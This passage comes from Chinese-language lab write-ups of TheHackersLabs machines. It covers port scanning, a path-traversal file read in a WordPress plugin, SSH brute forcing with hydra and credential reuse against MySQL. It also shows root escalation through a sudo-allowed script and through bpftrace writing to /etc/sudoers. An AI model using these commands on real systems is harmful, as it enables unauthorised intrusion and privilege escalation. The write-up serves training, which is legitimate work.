+注意，Linux中，pooc下面记录的tmp进程文件特别特别多，建议呢，将结果导入到文件中，然后就观察前面几条好了
+
+可以看到这里有个vivian用户密码有关的文件
+
+```bash
+$ cat /var/mail/gabri/.password_vivian.bf
+++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++.-----------.+++++++++++++++.---------------.+++++++++++++++++++.--.---.-.-------------.<<++++++++++++++++++++.--.++.+++.
+```
+
+这个是brainfuck编码，用[在线网站](https://ctf.bugku.com/tool/brainfuck)解密
+
+<img src="/assets/img/thehackerslabs-notes/image-20251122143653535.png" alt="image-20251122143653535" style="zoom:50%;" />
+
+拿到一对账密vivian/lapatrona2025
+
+直接ssh远程连接上去
+
+```bash
+(base) yolo@yolo:~$ ssh vivian@10.161.170.2
+The authenticity of host '10.161.170.2 (10.161.170.2)' can't be established.
+ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:31: [hashed name]
+    ~/.ssh/known_hosts:36: [hashed name]
+    ~/.ssh/known_hosts:37: [hashed name]
+    ~/.ssh/known_hosts:47: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.161.170.2' (ED25519) to the list of known hosts.
+vivian@10.161.170.2's password:
+Linux TheHackersLabs-facultad.thl 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have no mail.
+Last login: Mon Jan 27 22:29:26 2025 from 192.168.1.56
+$ id
+uid=1002(vivian) gid=1002(vivian) grupos=1002(vivian)
+$ sudo -l
+sudo: unable to resolve host TheHackersLabs-facultad.thl: Nombre o servicio desconocido
+Matching Defaults entries for vivian on TheHackersLabs-facultad:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User vivian may run the following commands on TheHackersLabs-facultad:
+    (ALL) NOPASSWD: /opt/vivian/script.sh
+$ /usr/bin/script -qc /bin/bash /dev/null
+vivian@TheHackersLabs-facultad:~$ ls
+user.txt
+vivian@TheHackersLabs-facultad:~$ nano /opt/vivian/script.sh
+vivian@TheHackersLabs-facultad:~$ sudo /opt/vivian/script.sh
+sudo: unable to resolve host TheHackersLabs-facultad.thl: Nombre o servicio desconocido
+root@TheHackersLabs-facultad:/home/vivian# id
+uid=0(root) gid=0(root) grupos=0(root)
+```
+
+这里我第一次见，直接ssh上去的终端依然不是很完整，我就使用下面这个命令
+
+`/usr/bin/script -qc /bin/bash /dev/null`
+
+接下来的终端交互起来就完美了
+
+然后呢，我再次sudo -l后，看到之前ps看进程发现的文件。我这里编辑的script.sh特别特别简单，是这样的
+
+```bash
+#!/bin/bash
+/bin/bash
+```
+
+解析一下的话，用sudo执行的话，就已经是root权限了，然后用/bin/bash可以直接唤起一个新的root终端，就获得一个root shell
+
+## Torrijas
+> **提示:** 靶机跳转传送门
+[Torrijas](https://labs.thehackerslabs.com/machines/92)
+
+<img src="/assets/img/thehackerslabs-notes/Torrijas.png" alt="Torrijas" style="zoom:50%;" />
+
+### 信息搜集
+
+扫描端口，发现这次多了个3306的MySQL服务
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.177.114
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-22 16:52 CST
+Nmap scan report for 10.161.177.114
+Host is up (0.89s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
+3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
+```
+
+然后dirsearch进行路径扫描，哈，怎么又一个wordpress，和上一个靶机看上去很像，然后这里一定要更改hosts文件，将`10.161.177.114 torrija.thl`追加上去
+
+在罗列的漏洞中，这里的uploads可以研究一下下
+
+<img src="/assets/img/thehackerslabs-notes/image-20251122172756858.png" alt="image-20251122172756858" style="zoom:50%;" />
+
+会发现wordpress的设置不当，可以看到上传的文件列表
+
+<img src="/assets/img/thehackerslabs-notes/image-20251122172856043.png" alt="image-20251122172856043" style="zoom:50%;" />
+
+暂时没找到有用的地方，来重新扫描一遍，这次看看有没有低版本的插件可以利用
+
+```bash
+pscan --url http://torrija.thl/wordpress/ --enumerate ap --force --plugins-detection mixed
+```
+
+不得不说，这个爆破插件真的特别特别的费时间哎，下次建议爆破的时候可以忙点别的事情
+
+<img src="/assets/img/thehackerslabs-notes/image-20251122204312961.png" alt="image-20251122204312961" style="zoom:50%;" />
+
+look here这里有个低版本的web-directory-free插件
+
+然后wpscan里面有相关漏洞利用[`payload`](https://wpscan.com/vulnerability/0e8930cb-e176-4406-a43f-a6032471debf/)就比如说未认证的任意文件读取漏洞
+
+```bash
+(base) yolo@yolo:~$ curl -X POST http://torrija.thl/wordpress/wp-admin/admin-ajax.php -d "from_set_ajax=1&action
+=w2dc_controller_request&template=../../../../../etc/passwd"
+{"html":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\n_apt:x:42:65534::\/nonexistent:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:998:998:systemd Network Management:\/:\/usr\/sbin\/nologin\nmessagebus:x:100:107::\/nonexistent:\/usr\/sbin\/nologin\nsshd:x:101:65534::\/run\/sshd:\/usr\/sbin\/nologin\ndebian:x:1000:1000:debian,,,:\/home\/debian:\/bin\/bash\nmysql:x:102:110:MySQL Server,,,:\/nonexistent:\/bin\/false\nprimo:x:1001:1001::\/home\/primo:\/bin\/bash\npremo:x:1002:1002::\/home\/premo:\/bin\/bash\n","hash":"91d75cb01d4a5d829e86bca1858566db","map_markers":"","map_listings":"","hide_show_more_listings_button":1,"sql":"","params":"","base_url":"http:\/\/torrija.thl\/wordpress"}
+```
+
+okey，接下来回到那个MySQL服务上，回到wp-config.php数据库连接文件中，看看有没有对应的账密
+
+emm，为啥啊，我发现没权限读取wp-config.php，那就来爆破一下用户premo
+
+### get shell
+
+```
+(base) yolo@yolo:~$ hydra -l premo -P /snap/seclists/rockyou.txt ssh://10.161.177.114 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-22 21:01:06
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
+[DATA] attacking ssh://10.161.177.114:22/
+[STATUS] 259.00 tries/min, 259 tries in 00:01h, 14344164 to do in 923:03h, 39 active
+[STATUS] 229.00 tries/min, 687 tries in 00:03h, 14343743 to do in 1043:57h, 32 active
+[22][ssh] host: 10.161.177.114   login: premo   password: cassandra
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 29 final worker threads did not complete until end.
+[ERROR] 29 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-22 21:05:43
+(base) yolo@yolo:~$ ssh premo@10.161.177.114
+The authenticity of host '10.161.177.114 (10.161.177.114)' can't be established.
+ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:31: [hashed name]
+    ~/.ssh/known_hosts:36: [hashed name]
+    ~/.ssh/known_hosts:37: [hashed name]
+    ~/.ssh/known_hosts:47: [hashed name]
+    ~/.ssh/known_hosts:48: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.161.177.114' (ED25519) to the list of known hosts.
+premo@10.161.177.114's password:
+Linux Torrija-TheHackersLabs 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 13 20:08:49 2025 from 192.168.18.204
+premo@Torrija-TheHackersLabs:~$
+```
+
+进入靶机后，我们读取一下wp-config.php，有我们需要的数据库的账密信息
+
+```bash
+premo@Torrija-TheHackersLabs:~$ cat /var/www/html/wordpress/wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'admin' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'afdvasgvfdsabdgvs6a9vd8sv' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ *
+ * At the installation time, database tables are created with the specified prefix.
+ * Changing this value after WordPress is installed will make your site think
+ * it has not been installed.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+```
+
+获取到数据库的密码，然后正常来说呢，是直接按照wp-config.php中说的那样，用admin用户连接MySQL直接读取wordpress相关的信息
+
+但是这样做显然有点绕了，因为已经进入靶机可以直接读取wordpress的代码了都，然后结合下3306那个端口的MySQL服务和这里的localhost数据库，显然是有差异的，那么就用root连接下MySQL，然后考虑密码喷洒，成功发现，这里的数据库还有个和靶机名一样的表 `Torrijas` 
+
+```bash
+(base) yolo@yolo:~$ mysql -h 10.161.177.114 -P 3306 -u root -pafdvasgvfdsabdgvs6a9vd8sv
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 143271
+Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| Torrijas           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+6 rows in set (0.004 sec)
+
+MariaDB [(none)]> use Torrijas;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [Torrijas]> show tables;
++--------------------+
+| Tables_in_Torrijas |
++--------------------+
+| primo              |
++--------------------+
+1 row in set (0.002 sec)
+
+MariaDB [Torrijas]> select * from primo;
++----+---------+----------------+
+| id | usuario | contraseña     |
++----+---------+----------------+
+|  1 | primo   | queazeshurmano |
++----+---------+----------------+
+1 row in set (0.003 sec)
+
+```
+
+然后可以直接ssh连上去，提权难度不大
+
+```bash
+(base) yolo@yolo:~$ ssh primo@10.161.177.114
+primo@10.161.177.114's password:
+Linux Torrija-TheHackersLabs 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 13 17:21:05 2025 from 192.168.18.204
+primo@Torrija-TheHackersLabs:~$ sudo -l
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+Matching Defaults entries for primo on Torrija-TheHackersLabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User primo may run the following commands on Torrija-TheHackersLabs:
+    (root) NOPASSWD: /usr/bin/bpftrace
+```
+
+bpftrace是一个强大的Linux追踪工具，基于eBPF技术，主要是进行系统调用追踪，性能分析，实时监控系统活动等等
+
+调用系统命令很轻松的
+
+```bash
+primo@Torrija-TheHackersLabs:~$ sudo bpftrace --unsafe -e 'BEGIN {system("whoami");exit()}'
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+Attaching 1 probe...
+root
+
+
+primo@Torrija-TheHackersLabs:~$ sudo bpftrace --unsafe -e 'BEGIN {system("/bin/bash");exit()}'
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+Attaching 1 probe...
+root@Torrija-TheHackersLabs:/home/primo# id
+root@Torrija-TheHackersLabs:/home/primo# whoami
+root@Torrija-TheHackersLabs:/home/primo# exit
+exit
+uid=0(root) gid=0(root) grupos=0(root)
+root
+```
+
+我这里选用个更轻松点的，直接写sudoers
+
+```bash
+primo@Torrija-TheHackersLabs:~$ cat exp.sh
+#!/bin/bash
+echo "primo ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+primo@Torrija-TheHackersLabs:~$ chmod +x exp.sh
+primo@Torrija-TheHackersLabs:~$ sudo bpftrace --unsafe -e 'BEGIN {system("/home/primo/exp.sh");exit();}'
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+Attaching 1 probe...
+
+
+primo@Torrija-TheHackersLabs:~$ sudo -l
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+Matching Defaults entries for primo on Torrija-TheHackersLabs:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User primo may run the following commands on Torrija-TheHackersLabs:
+    (root) NOPASSWD: /usr/bin/bpftrace
+    (ALL) NOPASSWD: ALL
+primo@Torrija-TheHackersLabs:~$ sudo su
+sudo: unable to resolve host Torrija-TheHackersLabs: Nombre o servicio desconocido
+root@Torrija-TheHackersLabs:/home/primo# id
+uid=0(root) gid=0(root) grupos=0(root)
+root@Torrija-TheHackersLabs:/home/primo# whoami
+root
+```
+
